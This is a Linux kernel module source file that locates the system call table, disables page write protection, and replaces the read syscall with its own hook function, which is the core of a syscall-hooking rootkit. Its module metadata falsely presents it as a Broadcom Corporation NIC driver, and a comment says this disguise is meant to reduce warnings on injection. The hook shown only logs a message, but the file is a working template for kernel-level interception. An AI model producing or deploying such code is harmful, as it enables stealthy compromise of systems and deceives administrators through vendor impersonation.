
#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>


//-- Required to reduce warnings on injection --
//#define DRIVER_AUTHOR "Broadcom Corporation"
//#define DRIVER_DESCRIPTION "Linux STA NIC driver"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Broadcom Corporation");
MODULE_DESCRIPTION("Linux_NIC_driver");
MODULE_VERSION("1");
MODULE_SUPPORTED_DEVICE("NIC_Device");

//-----------------------------------------------


unsigned long **SYS_CALL_TABLE; //Points to sys call table



/*
//Functions broken as of kernel 3.15
void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000)); //Setting processor flags to disable anti-writng feature

}

void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000); //Setting processor flag to reinable anti-writing feature

}

*/

//Patch for newer kernel
void EnablePageWriting(unsigned long address){
	unsigned int level;
	pte_t *pte = lookup_address(address, &level);

	if(pte->pte &~ _PAGE_RW){
		pte->pte |= _PAGE_RW;
	}
}

void DisablePageWriting(unsigned long address){
	unsigned int level;

	pte_t *pte = lookup_address(address, &level);

	pte->pte = pte->pte &~ _PAGE_RW;

} 



asmlinkage int (*original_read)(unsigned int, void __user*, size_t); //Normal read function

//Modified Read function

asmlinkage int  HookRead(unsigned int fd, void __user* buf, size_t count) { 
	printk(KERN_INFO "READ HERE"); 
	return (*original_read)(fd, buf, count); //Return to original read
}






static int __init SetHooks(void) {
	// Fetch Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); //Get pointer to funcs

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

	//Since sys_call_table is the address we want to overwrite (write to) we can parse it here to do so
	EnablePageWriting( (unsigned long )SYS_CALL_TABLE ); //Overwrite desired syscall

    // Replaces Pointer Of Syscall_read on our syscall.
	original_read = (void*)SYS_CALL_TABLE[__NR_read];
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)HookRead; //Point to our code
	
	DisablePageWriting( (unsigned long)SYS_CALL_TABLE ); //Return to normal mode (pages safe again)

	return 0;
}






//On module unload
static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting( (unsigned long) SYS_CALL_TABLE );
	SYS_CALL_TABLE[__NR_read] = (unsigned long*)original_read;
	DisablePageWriting( (unsigned long) SYS_CALL_TABLE );

	printk(KERN_INFO "HooksCleaned Up!");
}

module_init(SetHooks);
module_exit(HookCleanup);